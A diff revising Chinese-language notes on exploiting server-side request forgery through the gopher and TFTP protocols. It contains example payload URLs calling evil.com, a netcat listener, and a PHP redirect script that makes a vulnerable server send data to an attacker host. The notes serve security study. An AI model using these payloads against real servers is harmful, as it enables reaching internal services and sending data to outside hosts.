@@ -39,14 +39,12 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
     * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
 
 
-Gopher协议 - 重要作用:几乎可与任意TCP service交互
-(1)指定监听`ip` `port` `bytes`
-(2)you can exploit a SSRF to communicate with any TCP service.
-
-but you need to know how to talk to the service first.
+* Gopher协议 - 重要作用:几乎可与任意TCP service交互
+  * (1)指定监听`ip` `port` `bytes`
+  * (2)you can exploit a SSRF to communicate with any TCP service.(but you need to know how to talk to the service first.)
 
 
-TFTP协议 - 重要作用:几乎可构造并发送任意的**UDP** packets
+* TFTP协议 - 重要作用:几乎可构造并发送任意的**UDP** packets
 ```
 Request:
 https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET
@@ -220,29 +218,27 @@ SSRF自动化工具 用于发现漏洞、生成payload等
 
 -----
 
-### gopher协议 - 利用原理
+### gopher协议 - 结合跳转利用SSRF过程
 
-前提：存在SSRF漏洞的web后端所在的服务器支持gopher协议.
+前提：存在SSRF漏洞的web后端所用的函数支持gopher协议.
 
-攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。
+攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网IP(或任何网络可达的主机)的任意的port发送TCP协议的数据.
 
-先在攻击者公网主机ReciveData.com上监听1337端口，看一会能否收到数据:
+攻击者公网主机ReciveData.com上 监听1337端口:
 ```
 evil.com:# nc -lvp 1337
 ```
 
-gopher.php (在攻击者的公网web服务器gopher.com上) :
-如果有http请求访问 http://gopher.com/gopher.php 则httpResponse将会是一个301、302跳转，使用gopher协议对某主机的某端口发送数据。
+攻击者公网服务器 `evil.com/gopher.php`的内容:
 ```
 <?php
   header('Location: gopher://ReciveData.com:1337/_Hi%0Assrf');
 ?>
 ```
 
-攻击者构造http请求，试图让 存在SSRF漏洞的web后端所在的服务器 去访问 http://gopher.com/gopher.php
+攻击者构造HTTP请求发向"存在SSRF漏洞的web服务器",使该服务器发出HTTP请求到 `http://evil.com/gopher.php`, 该服务器得到HTTP Response是一个301/302跳转,如果该服务器跟随了跳转,向`gopher`链接发出请求,则该服务器对指定IP的指定port发送TCP协议的指定数据,实现SSRF
 
-
-测试结果，攻击者公网主机ReciveData.com的1337端口，收到了 存在SSRF漏洞的web后端所在的服务器 发来的数据：
+攻击者公网主机(ReciveData.com的TCP port 1337) 收到了"存在SSRF漏洞的web服务器"发来的数据:
 ```
 Hi
 ssrf
